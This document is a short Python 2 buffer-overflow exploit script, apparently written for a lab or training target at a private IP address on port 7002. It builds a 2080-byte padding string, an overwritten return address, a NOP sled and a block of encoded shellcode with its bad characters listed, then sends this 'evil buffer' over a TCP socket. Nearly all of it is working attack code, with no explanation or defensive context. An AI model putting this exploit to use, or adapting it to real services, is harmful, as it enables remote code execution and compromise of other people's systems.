#!/usr/bin/python
import socket

shellcode = (
"\xb8\x98\x29\x17\x81\xdb\xc0\xd9\x74\x24\xf4\x5f\x29\xc9\xb1"
"\x52\x83\xef\xfc\x31\x47\x0e\x03\xdf\x27\xf5\x74\x23\xdf\x7b"
"\x76\xdb\x20\x1c\xfe\x3e\x11\x1c\x64\x4b\x02\xac\xee\x19\xaf"
"\x47\xa2\x89\x24\x25\x6b\xbe\x8d\x80\x4d\xf1\x0e\xb8\xae\x90"
"\x8c\xc3\xe2\x72\xac\x0b\xf7\x73\xe9\x76\xfa\x21\xa2\xfd\xa9"
"\xd5\xc7\x48\x72\x5e\x9b\x5d\xf2\x83\x6c\x5f\xd3\x12\xe6\x06"
"\xf3\x95\x2b\x33\xba\x8d\x28\x7e\x74\x26\x9a\xf4\x87\xee\xd2"
"\xf5\x24\xcf\xda\x07\x34\x08\xdc\xf7\x43\x60\x1e\x85\x53\xb7"
"\x5c\x51\xd1\x23\xc6\x12\x41\x8f\xf6\xf7\x14\x44\xf4\xbc\x53"
"\x02\x19\x42\xb7\x39\x25\xcf\x36\xed\xaf\x8b\x1c\x29\xeb\x48"
"\x3c\x68\x51\x3e\x41\x6a\x3a\x9f\xe7\xe1\xd7\xf4\x95\xa8\xbf"
"\x39\x94\x52\x40\x56\xaf\x21\x72\xf9\x1b\xad\x3e\x72\x82\x2a"
"\x40\xa9\x72\xa4\xbf\x52\x83\xed\x7b\x06\xd3\x85\xaa\x27\xb8"
"\x55\x52\xf2\x6f\x05\xfc\xad\xcf\xf5\xbc\x1d\xb8\x1f\x33\x41"
"\xd8\x20\x99\xea\x73\xdb\x4a\xd5\x2c\x22\x80\xbd\x2e\xa4\x94"
"\x86\xa6\x42\xfc\xe8\xee\xdd\x69\x90\xaa\x95\x08\x5d\x61\xd0"
"\x0b\xd5\x86\x25\xc5\x1e\xe2\x35\xb2\xee\xb9\x67\x15\xf0\x17"
"\x0f\xf9\x63\xfc\xcf\x74\x98\xab\x98\xd1\x6e\xa2\x4c\xcc\xc9"
"\x1c\x72\x0d\x8f\x67\x36\xca\x6c\x69\xb7\x9f\xc9\x4d\xa7\x59"
"\xd1\xc9\x93\x35\x84\x87\x4d\xf0\x7e\x66\x27\xaa\x2d\x20\xaf"
"\x2b\x1e\xf3\xa9\x33\x4b\x85\x55\x85\x22\xd0\x6a\x2a\xa3\xd4"
"\x13\x56\x53\x1a\xce\xd2\x73\xf9\xda\x2e\x1c\xa4\x8f\x92\x41"
"\x57\x7a\xd0\x7f\xd4\x8e\xa9\x7b\xc4\xfb\xac\xc0\x42\x10\xdd"
"\x59\x27\x16\x72\x59\x62"
) # badchars: \x00\x3b\x45\xff

try:
  print("\nSending evil buffer...")

  offset = "A" * 2080
  eip    = "\x3d\x11\x80\x14" # 1480113d
  nops   = "\x90" * 12

  s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
  s.connect(("192.168.193.10", 7002))
  s.send(offset + eip + nops + shellcode)
  s.close()

  print("\nDone!")

except:
  print("\nCould not connect!")